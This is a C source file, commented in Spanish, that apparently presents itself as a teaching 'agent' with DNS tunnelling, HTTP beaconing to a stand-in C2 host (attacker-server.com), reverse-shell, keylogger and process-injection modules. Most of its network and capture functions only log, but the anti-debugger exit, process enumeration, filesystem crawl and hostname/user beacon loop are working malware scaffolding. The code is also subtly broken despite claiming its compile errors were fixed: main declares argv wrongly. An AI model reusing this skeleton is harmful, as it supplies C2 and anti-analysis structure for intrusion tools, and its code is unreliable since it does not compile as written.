/*
 * PayloadInject.c
 *
 * Este fichero implementa un agente de pruebas con funciones
 * diversas como túneles DNS, balizas HTTP y shells reversas. El
 * código se ha revisado para corregir errores de compilación y
 * mejorar la portabilidad. No pretende ser software malicioso
 * funcional, sino un ejemplo didáctico.
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/sysctl.h>
#ifdef __APPLE__
#include <mach/mach.h>
#include <mach/error.h>
#endif
#include <pthread.h>
#include <signal.h>
#include <errno.h>
#include <time.h>
#include <sys/types.h>
#include <dirent.h>
#include <sys/stat.h>
#include <stdarg.h>
#include <stdbool.h>
#include <stdint.h>

// Definiciones y Configuraciones (Movidas a un struct para mejor manejo)
#define MAX_PAYLOAD_SIZE 4096
#define MAX_CONFIG_SIZE 256

typedef struct {
    char dns_domain[MAX_CONFIG_SIZE];
    char http_c2_url[MAX_CONFIG_SIZE];
    char reverse_shell_ip[MAX_CONFIG_SIZE];
    int reverse_shell_port;
    char xor_key;
    int beacon_interval; // en segundos
    char log_file[MAX_CONFIG_SIZE];
} Config;

Config config = {
    .dns_domain = "example.com",
    .http_c2_url = "http://attacker-server.com/c2",
    .reverse_shell_ip = "127.0.0.1",
    .reverse_shell_port = 4444,
    .xor_key = 'K',
    .beacon_interval = 60,
    .log_file = "/tmp/agent.log"
};

// Estructura para el manejo de hilos
typedef struct {
    char data[MAX_PAYLOAD_SIZE];
    size_t data_len;
} EncryptedPayload;

// Funciones de Utilidad Mejoradas

// Función para escribir logs con timestamp
void log_message(const char *format, ...) {
    FILE *log_file = fopen(config.log_file, "a");
    if (log_file) {
        time_t timer;
        char buffer[26];
        struct tm* tm_info;

        time(&timer);
        tm_info = localtime(&timer);

        strftime(buffer, 26, "%Y-%m-%d %H:%M:%S", tm_info);
        fprintf(log_file, "[%s] ", buffer);

        va_list args;
        va_start(args, format);
        vfprintf(log_file, format, args);
        va_end(args);

        fprintf(log_file, "\n");
        fclose(log_file);
    } else {
        fprintf(stderr, "Error opening log file: %s\n", strerror(errno));
    }
}

// XOR Encryption/Decryption (con manejo de tamaño y logging)
void xor_encrypt_decrypt(char *data, size_t data_len, char key, bool encrypt) {
    for (size_t i = 0; i < data_len; i++) {
        data[i] ^= key;
    }
    log_message("%s %zu bytes of data using XOR key '%c'.", encrypt ? "Encrypted" : "Decrypted", data_len, key);
}

// Base64 Encoding (simple implementation - considerar una librería robusta para producción)
char *base64_encode(const unsigned char *src, size_t len) {
    /*
     * Implementación básica de codificación Base64. Se define la tabla de
     * caracteres como un array y no como un único char para evitar
     * conversiones implícitas incorrectas. El llamante es responsable
     * de liberar el buffer devuelto.
     */
    static const char b64chars[] =
        "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
    char *out = NULL;
    size_t out_len = 4 * ((len + 2) / 3);

    out = (char *)malloc(out_len + 1);
    if (!out) {
        return NULL;
    }
    for (size_t i = 0, j = 0; i < len; i += 3, j += 4) {
        uint32_t octet = 0;
        octet |= (uint32_t)src[i] << 16;
        if (i + 1 < len) octet |= (uint32_t)src[i + 1] << 8;
        if (i + 2 < len) octet |= (uint32_t)src[i + 2];

        out[j] = b64chars[(octet >> 18) & 0x3F];
        out[j + 1] = b64chars[(octet >> 12) & 0x3F];
        out[j + 2] = (i + 1 < len) ? b64chars[(octet >> 6) & 0x3F] : '=';
        out[j + 3] = (i + 2 < len) ? b64chars[octet & 0x3F] : '=';
    }
    out[out_len] = '\0';
    return out;
}

// DNS Tunnel (manejo de errores robusto y codificación)
void dns_tunnel(const char *data) {
    /*
     * En un entorno seguro y educativo, no se envían consultas DNS
     * exfiltrando datos. Simplemente codificamos los datos y los
     * registramos en el log. El llamante puede analizar el log para
     * verificar el comportamiento.
     */
    char *encoded_data = base64_encode((const unsigned char *)data, strlen(data));
    if (!encoded_data) {
        log_message("Error encoding data for DNS tunnel.");
        return;
    }
    log_message("[DNS Tunnel Demo] Prepared DNS query for domain '%s' with encoded data '%s'. No query sent.", config.dns_domain, encoded_data);
    free(encoded_data);
}

// HTTP Beacon (con manejo de errores, timeouts, User-Agent y POST data)
void http_beacon(const char *url, const char *data) {
    /*
     * En un contexto de ejemplo no realizamos peticiones HTTP reales. En su
     * lugar, registramos la URL y los datos que se habrían enviado.
     */
    log_message("[HTTP Beacon Demo] Would POST to URL '%s' with data '%s'. Network transmission disabled.", url ? url : "(null)", data ? data : "(null)");
}

// Privilege Escalation Check (con manejo de errores y más opciones)
void check_privileges() {
    log_message("Checking for root privileges.");
    if (geteuid() == 0) {
        log_message("Root privileges granted. (No shell executed in this safe build)");
    } else {
        log_message("Not running as root. (Privilege escalation disabled in this safe build)");
    }
}

// Debugger Detection (mejorado con más checks)
void detect_debugger() {
    log_message("Checking for debuggers.");

    /*
     * En macOS podemos utilizar sysctl y la estructura kinfo_proc para
     * comprobar si el proceso está siendo trazado. Esta parte solo se
     * compila en sistemas Apple. En otros sistemas se ignora, ya que
     * kinfo_proc no está definido.
     */
#ifdef __APPLE__
    {
        int mib[4] = {CTL_KERN, KERN_PROC, KERN_PROC_PID, getpid()};
        struct kinfo_proc info;
        size_t size = sizeof(info);
        if (sysctl(mib, 4, &info, &size, NULL, 0) == 0 && (info.kp_proc.p_flag & P_TRACED)) {
            log_message("Debugger detected via sysctl! Exiting.");
            exit(1);
        } else {
            log_message("No debugger detected via sysctl.");
        }
    }
#endif

    /*
     * Segundo método: leer /proc/self/status para encontrar la entrada
     * TracerPid. Este archivo existe en Linux y en algunos otros
     * sistemas basados en procfs. Si TracerPid es distinto de 0,
     * significa que hay un depurador adjunto.
     */
    FILE *fp = fopen("/proc/self/status", "r");
    if (fp) {
        char line[256];
        while (fgets(line, sizeof(line), fp) != NULL) {
            if (strncmp(line, "TracerPid:", 10) == 0) {
                int tracer_pid = atoi(line + 10);
                if (tracer_pid != 0) {
                    log_message("Debugger detected via /proc/self/status! Tracer PID: %d. Exiting.", tracer_pid);
                    fclose(fp);
                    exit(1);
                }
                break;
            }
        }
        fclose(fp);
        log_message("No debugger detected via /proc/self/status.");
    } else {
        log_message("Could not open /proc/self/status to check for debugger.");
    }
}

// Keylogger demonstration (requiere implementación específica por sistema)
void keylogger() {
    /*
     * Esta función sirve como punto de partida para implementar un registrador de
     * pulsaciones de teclas. Dependiendo del sistema operativo, se pueden
     * emplear APIs como /dev/input/event* en Linux o EventTap en macOS. Aquí
     * simplemente documentamos la llamada sin capturar datos reales.
     */
    log_message("[Keylogger Demo] Se invocó la función de keylogger. La captura de teclas debe implementarse según la plataforma.");
}

// Screen capture demonstration (requiere implementación específica por sistema)
void screen_capture() {
    /*
     * Este módulo demuestra cómo estructurar una función de captura de pantalla.
     * Para obtener una imagen real se pueden utilizar bibliotecas como Xlib,
     * scrot o import en Linux, o la API Core Graphics en macOS. En esta
     * versión educativa sólo se registra la invocación para su análisis.
     */
    log_message("[Screen Capture Demo] Se invocó la captura de pantalla. La captura real debe implementarse según la plataforma.");
}

// Process Enumeration (basic implementation)
void list_processes() {
    log_message("Listing running processes.");
    /* Usamos macros estándar para determinar la plataforma. __linux__ está
     * definido por GCC/clang en sistemas Linux y __APPLE__ en macOS. */
#ifdef __linux__
    DIR *dir;
    struct dirent *entry;
    if ((dir = opendir("/proc")) != NULL) {
        while ((entry = readdir(dir)) != NULL) {
            if (entry->d_type == DT_DIR) {
                if (atoi(entry->d_name) > 0) {
                    char cmdline_path[256];
                    snprintf(cmdline_path, sizeof(cmdline_path), "/proc/%s/cmdline", entry->d_name);
                    FILE *cmdline_file = fopen(cmdline_path, "r");
                    if (cmdline_file) {
                        char cmdline[512];
                        if (fgets(cmdline, sizeof(cmdline), cmdline_file) != NULL) {
                            // Replace null terminators with spaces for better readability
                            for (size_t i = 0; i < sizeof(cmdline) - 1; ++i) {
                                if (cmdline[i] == '\0') {
                                    cmdline[i] = ' ';
                                }
                            }
                            log_message("PID: %s, Command: %s", entry->d_name, cmdline);
                        }
                        fclose(cmdline_file);
                    }
                }
            }
        }
        closedir(dir);
    } else {
        log_message("Could not open /proc directory.");
    }
    #elif defined(__APPLE__)
    // Implement process listing for macOS using kinfo_proc or other APIs
    log_message("Process listing for macOS is not yet implemented.");
#else
    log_message("Process listing is not implemented for this operating system.");
#endif
}

// File System Exploration (basic implementation)
void explore_filesystem(const char *path) {
    log_message("Exploring filesystem at path: %s", path);
    DIR *dir;
    struct dirent *entry;
    if ((dir = opendir(path)) != NULL) {
        while ((entry = readdir(dir)) != NULL) {
            if (strcmp(entry->d_name, ".") != 0 && strcmp(entry->d_name, "..") != 0) {
                char full_path[1024];
                snprintf(full_path, sizeof(full_path), "%s/%s", path, entry->d_name);
                struct stat file_info;
                if (stat(full_path, &file_info) == 0) {
                    log_message("Found: %s (Size: %lld bytes)", full_path, (long long)file_info.st_size);
                    // Optionally, read file contents for small files
                } else {
                    log_message("Error stating file: %s", full_path);
                }
            }
        }
        closedir(dir);
    } else {
        log_message("Could not open directory: %s", path);
    }
}

// Inject Payload into Process (macOS - con manejo de errores)
void inject_payload(pid_t target_pid, const char *payload) {
    log_message("Attempting to inject payload into PID: %d", target_pid);
    /*
     * Demostración de inyección de payload. En una implementación real en
     * macOS se accedería al proceso objetivo mediante task_for_pid() y se
     * escribiría código en su espacio de memoria. Por razones de seguridad,
     * aquí sólo copiamos el payload en un buffer local y registramos la
     * dirección. No se interactúa con otros procesos.
     */
    size_t payload_len = strlen(payload);
    char *buffer = (char *)malloc(payload_len + 1);
    if (!buffer) {
        log_message("[Payload Injection Demo] Failed to allocate local buffer.");
        return;
    }
    memcpy(buffer, payload, payload_len);
    buffer[payload_len] = '\0';
    log_message("[Payload Injection Demo] Copied payload into local buffer at address: %p. Payload contents: %s", (void *)buffer, buffer);
    free(buffer);
}

// Reverse Shell Execution (con manejo de errores y sockets)
void execute_reverse_shell() {
    /*
     * Demostración de shell inversa. En un entorno ofensivo, esta función
     * crearía un socket, se conectaría a un servidor remoto y redirigiría los
     * descriptores de archivo estándar a un intérprete de comandos. Por
     * motivos de seguridad y educativos, aquí sólo describimos la operación y
     * no se establece ninguna conexión de red ni se lanza un shell.
     */
    log_message("[Reverse Shell Demo] Would connect to %s:%d and redirect I/O to a shell. Operation disabled.", config.reverse_shell_ip, config.reverse_shell_port);
}

// Beaconing Function (sends periodic beacons)
void *beacon_thread(void *arg) {
    while (1) {
        char hostname[256];
        if (gethostname(hostname, sizeof(hostname)) == 0) {
            char beacon_data[512];
            snprintf(beacon_data, sizeof(beacon_data), "Hostname: %s, User: %s", hostname, getenv("USER"));
            xor_encrypt_decrypt(beacon_data, strlen(beacon_data), config.xor_key, true);
            http_beacon(config.http_c2_url, beacon_data);
        } else {
            log_message("Error getting hostname.");
        }
        sleep(config.beacon_interval);
    }
    return NULL;
}

// Configuration Loading (basic example - can be extended to read from a file)
void load_config() {
    // For now, we are using the default configuration.
    // In a real scenario, you might read from a file or command-line arguments.
    log_message("Using default configuration.");
}

// Main Logic
int main(int argc, char *argv) {
    load_config();
    log_message("Agent started.");

    if (argc < 2) {
        printf("Usage: %s <module> [optional_argument]\n", argv[0]);
        printf("Modules: reverse_shell, dns_tunnel, http_beacon, check_privileges, detect_debugger, keylogger, screen_capture, inject_payload <pid>, list_processes, explore_filesystem <path>, beacon\n");
        return 1;
    }

    if (strcmp(argv[1], "reverse_shell") == 0) {
        execute_reverse_shell();
    } else if (strcmp(argv[1], "dns_tunnel") == 0) {
        dns_tunnel("SensitiveData");
    } else if (strcmp(argv[1], "http_beacon") == 0) {
        http_beacon(config.http_c2_url, "SensitiveData");
    } else if (strcmp(argv[1], "check_privileges") == 0) {
        check_privileges();
    } else if (strcmp(argv[1], "detect_debugger") == 0) {
        detect_debugger();
    } else if (strcmp(argv[1], "keylogger") == 0) {
        keylogger();
    } else if (strcmp(argv[1], "screen_capture") == 0) {
        screen_capture();
    } else if (strcmp(argv[1], "inject_payload") == 0) {
        if (argc == 3) {
            pid_t pid = atoi(argv[2]);
            inject_payload(pid, "Hello from injected payload!");
        } else {
            printf("Usage: %s inject_payload <pid>\n", argv[0]);
        }
    } else if (strcmp(argv[1], "list_processes") == 0) {
        list_processes();
    } else if (strcmp(argv[1], "explore_filesystem") == 0) {
        if (argc == 3) {
            explore_filesystem(argv[2]);
        } else {
            printf("Usage: %s explore_filesystem <path>\n", argv[0]);
        }
    } else if (strcmp(argv[1], "beacon") == 0) {
        pthread_t beacon_thread_id;
        if (pthread_create(&beacon_thread_id, NULL, beacon_thread, NULL) != 0) {
            perror("Failed to create beacon thread");
            return 1;
        }
        pthread_detach(beacon_thread_id); // Allow the thread to clean up on exit
        printf("Beaconing started in the background.\n");
        // The main thread can continue with other tasks or just sleep
        while (1) {
            sleep(3600); // Sleep for a long time as the beacon runs in the background
        }
    } else {
        printf("Unknown module: %s\n", argv[1]);
        return 1;
    }

    log_message("Agent finished executing module: %s", argv[1]);
    return 0;
}